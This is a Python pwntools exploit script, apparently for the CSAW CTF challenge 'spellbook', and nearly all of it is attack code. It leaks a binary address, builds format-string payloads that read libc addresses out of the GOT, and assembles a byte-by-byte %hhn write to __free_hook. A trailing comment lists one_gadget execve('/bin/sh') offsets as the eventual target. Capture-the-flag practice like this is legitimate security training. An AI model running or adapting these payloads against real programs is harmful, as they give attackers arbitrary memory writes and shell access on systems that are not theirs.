#!/usr/bin/python2

from pwn import *
from time import sleep

local = True
if local:
    p = process('./spellbook')
else:
    p = remote('crypto.red.csaw.io', 5000)

p.recvuntil("> ")

SPELLNAME_REGISTRY_OFFSET = 0x20202a # 0xc10c0 - 0xbf000
#GOT_OFFSET = 0x7b0 # puts@plt during first round of solver testing
PUTS_GOT_OFFSET = 0x201f88
PRINTF_GOT_OFFSET = 0x201f98
MAIN_OFFSET = 0xcfa


#PUTS_PTR_PTR_OFFSET = 0x7b6 # address in GOT; instruction is jump to offset [rip + 0x2017d2]
#PUTS_PTR_OFFSET = 0x7b6 + 0x2017d2
def get_GOT_addr():
    p.send("1337\n")
    p.recvuntil("at ")
    spellname_registry_addr_string = p.recv(14)
    #print("Spell name address in BSS is " + spellname_addr_string)
    SPELLNAME_REGISTRY_ADDR = int(spellname_registry_addr_string, 16)
    PUTS_GOT_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + PUTS_GOT_OFFSET
    MAIN_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + MAIN_OFFSET
    #PRINTF_GOT_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + PRINTF_GOT_OFFSET
    #print("Hex of that addresss is " + hex(SPELLNAME_ADDR))
    print("Hex of GOT puts address is " + hex(PUTS_GOT_ADDR))
    print("Address of main is" + hex(MAIN_ADDR))
    #print("Hex of GOT printf address is " + hex(PRINTF_GOT_ADDR))
    p.recvuntil("> ")
    return(SPELLNAME_REGISTRY_ADDR, PUTS_GOT_ADDR, MAIN_ADDR)

def calculate_next_fmt_string_field_width_char(bytes_written, target_next_byte):
    field_width = target_next_byte - (bytes_written % 256)
    if field_width < 9: # There's a minimum width and I want this to work for 32-bit and 64-bit applications
        field_width += 256
    return field_width

def designate_spell_name(signature, name):
    p.send("2\n")
    p.recvuntil("entry: \n")
    p.send(signature + "\n")
    p.recvuntil("cast: \n")
    p.send(name + "\n")
    p.recvuntil("> ")

def designate_invocation(signature, invocation):
    p.send("3\n")
    p.recvuntil("entry: \n")
    p.send(signature + "\n")
    p.recvuntil("spell: \n")
    p.send(invocation + "\n")
    p.recvuntil("> ")


# Assumes that the GOT address is the PUTS GOT address
def leak_two_libc_addresses(PUTS_GOT_addr):
    #print("In leak_two_libc_addresses: ")
    GETCHAR_GOT_ADDR = PUTS_GOT_ADDR + 0x20 # getchar
    print("GOT_ADDR is at " + hex(PUTS_GOT_ADDR))
    payload1 = "%49$sAAA%50$sBBB"
    payload1 += "AAAABBBBCCCCDDDDEEEEFFFF"
    #payload1 += "GGGGHHHHIIIIJJJJ"
    payload1 += p64(PUTS_GOT_ADDR)
    payload1 += p64(GETCHAR_GOT_ADDR)
    payload1 += "%p "*((240-len(payload1))/3)
    designate_spell_name("1",payload1)
    #sleep(20)
    p.send("1337\n")
    #p.interactive()

    p.recvuntil("value 1\n")
    puts_libc_addr_string = p.recv(6)
    PUTS_LIBC_ADDR = u64(puts_libc_addr_string + "\x00\x00")
    print("PUTS_libc_address is " + hex(PUTS_LIBC_ADDR))
    #PUTS_LIBC_ADDR = int(p.recv(14),16)
    p.recvuntil("AAA") # Next three characters
    getchar_libc_addr_string = p.recv(6)
    GETCHAR_LIBC_ADDR = u64(getchar_libc_addr_string + "\x00\x00")
    return(PUTS_LIBC_ADDR, GETCHAR_LIBC_ADDR)

SPELLNAME_REGISTRY_ADDR, PUTS_GOT_ADDR, MAIN_ADDR = get_GOT_addr()
print("PUTS_GOT adddress is " + hex(PUTS_GOT_ADDR))
print("And address of main() is " + hex(MAIN_ADDR))
print("And address of spellname registry is " + hex(SPELLNAME_REGISTRY_ADDR))
PUTS_LIBC_ADDR, GETCHAR_LIBC_ADDR = leak_two_libc_addresses(PUTS_GOT_ADDR)
print("Found puts_libc at " + hex(PUTS_LIBC_ADDR))
print("Found getchar_libc at " + hex(GETCHAR_LIBC_ADDR))

# Next get free hook and a one gadget address.

if local:
    PUTS_OFFSET = 0x80a30
    FREE_HOOK_OFFSET = 0x3ed8e8
    ONE_GADGET_OFFSET = 0x10a45c
    FREE_HOOK_ADDR = PUTS_LIBC_ADDR - PUTS_OFFSET + FREE_HOOK_OFFSET
    ONE_GADGET_ADDR = PUTS_LIBC_ADDR - PUTS_OFFSET + ONE_GADGET_OFFSET
    print("Free hook address: " + hex(FREE_HOOK_ADDR))
    print("One gadget address: " + hex(ONE_GADGET_ADDR))

# Now I want to write the one gadget address to the LIBC free hook.

p.send("3\n")
p.recvuntil("entry: \n")
p.send("1\n")
p.recvuntil("spell: \n")


#def write_int(content, dest):


#content = ONE_GADGET_ADDR
content = MAIN_ADDR
dest = FREE_HOOK_ADDR
print("Attempting to write " + hex(content) + " to " + hex(dest) + ".")

to_write = "0x" + "0"*(16-(len(hex(content)[2:]))) + hex(content)[2:]

print("to_write = " + to_write)

#p.send("%p      "*12 + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\n")
'''
payload2 = "%30$p" + "a"*(16-6) +" "
payload2 += "%31$p" + "b"*(16-6) +" "
payload2 += "%32$p" + "c"*(16-6) +" "
payload2 += "%33$p" + "d"*(16-6) +" "
payload2 += "%34$p" + "e"*(16-6) +" "
payload2 += "%35$p" + "f"*(16-6) +" "
payload2 += "%36$p" + "g"*(16-6) +" "
payload2 += "%37$p" + "h"*(16-6) +" "
payload2 += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
p.send(payload2 + "\n")
'''
char1 = int(to_write[len(to_write)-2:],16)
char2 = int(to_write[len(to_write)-4:len(to_write)-2],16)
char3 = int(to_write[len(to_write)-6:len(to_write)-4],16)
char4 = int(to_write[len(to_write)-8:len(to_write)-6],16)
char5 = int(to_write[len(to_write)-10:len(to_write)-8],16)
char6 = int(to_write[len(to_write)-12:len(to_write)-10],16)
char7 = int(to_write[len(to_write)-14:len(to_write)-12],16)
char8 = int(to_write[2:len(to_write)-14],16)
#char1 = int(hex(content)[len(hex(content))-2:],16)
#char2 = int(hex(content)[len(hex(content))-4:len(hex(content))-2],16)
#char3 = int(hex(content)[len(hex(content))-6:len(hex(content))-4],16)
#char4 = int(hex(content)[2:len(hex(content))-6],16)
print(hex(char1))
print(hex(char2))
print(hex(char3))
print(hex(char4))
print(hex(char5))
print(hex(char6))
print(hex(char7))
print(hex(char8))

bytes_written = 0
fmtstring0 = "%32$hhn%33$hhn"
payload = fmtstring0
padding0 = "A"*(16 - len(fmtstring0))
payload += padding0
bytes_written += len(padding0)

space1 = calculate_next_fmt_string_field_width_char(bytes_written, char1)
#space1 = %005x%120$hhn  # 13 characters in string, pad with three A's
fmtstring1 = "%" + str(space1) + "x%34$hhn" #"x%26$hhn"
payload += fmtstring1
bytes_written += space1
padding1 = "A" * (16 - len(fmtstring1))
payload += padding1
bytes_written += len(padding1)

space2 = calculate_next_fmt_string_field_width_char(bytes_written, char2)
bytes_written += space2
fmtstring2 = "%" + str(space2) + "x%35$hhn"
payload += fmtstring2
padding2 = "A"* (16 - len(fmtstring2))
payload += padding2
bytes_written += len(padding2)

space3 = calculate_next_fmt_string_field_width_char(bytes_written, char3)
bytes_written += space3
fmtstring3 = "%" + str(space3) + "x%36$hhn"
payload += fmtstring3
padding3 = "A"* (16 - len(fmtstring3))
payload += padding3
bytes_written += len(padding3)

space4 = calculate_next_fmt_string_field_width_char(bytes_written, char4)
bytes_written += space4
fmtstring4 = "%" + str(space4) + "x%37$hhn"
payload += fmtstring4
padding4 = "A"* (16 - len(fmtstring4))
payload += padding4
bytes_written += len(padding4)

space5 = calculate_next_fmt_string_field_width_char(bytes_written, char5)
bytes_written += space5
fmtstring5 = "%" + str(space5) + "x%38$hhn"
payload += fmtstring5
padding5 = "A"* (16 - len(fmtstring5))
payload += padding5
bytes_written += len(padding5)

space6 = calculate_next_fmt_string_field_width_char(bytes_written, char6)
bytes_written += space6
fmtstring6 = "%" + str(space6) + "x%39$hhn"
payload += fmtstring6
padding6 = "A"* (16 - len(fmtstring6))
payload += padding6
bytes_written += len(padding6)

space7 = calculate_next_fmt_string_field_width_char(bytes_written, char7)
bytes_written += space7
fmtstring7 = "%" + str(space7) + "x%40$hhn"
payload += fmtstring7
padding7 = "A"* (16 - len(fmtstring7))
payload += padding7
bytes_written += len(padding7)

space8 = calculate_next_fmt_string_field_width_char(bytes_written, char8)
bytes_written += space8
fmtstring8 = "%" + str(space8) + "x%41$hhn"
payload += fmtstring8
padding8 = "A"* (16 - len(fmtstring8))
payload += padding8
bytes_written += len(padding8)

#payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
#p.send(payload + "\n")
#p.interactive()
#payload += "\x00"*(338 - len(payload))
#payload += "CCCCDD"
payload += p64(SPELLNAME_REGISTRY_ADDR-1)
payload += p64(SPELLNAME_REGISTRY_ADDR)
payload += p64(dest)
payload += p64(dest+1)
payload += p64(dest+2)
payload += p64(dest+3)
payload += p64(dest+4)
payload += p64(dest+5)
payload += p64(dest+6)
payload += p64(dest+7)
#payload += p64(content)
payload += "\n"
#payload = "A"*512 + "B"*4 + "C" * 4 + "D"*4 + "E" * 4 + "F" * 4
sleep(20)
p.send(payload)
'''
p.recvuntil("Congrats: ")
print("Received Congrats.")
# Not sure if I'll need to include this next line...
#p.recvuntil("guess?\n")
#print("Received guess?")
'''
p.interactive()

#0x55bedbdc10c0

'''
local:
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c    execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''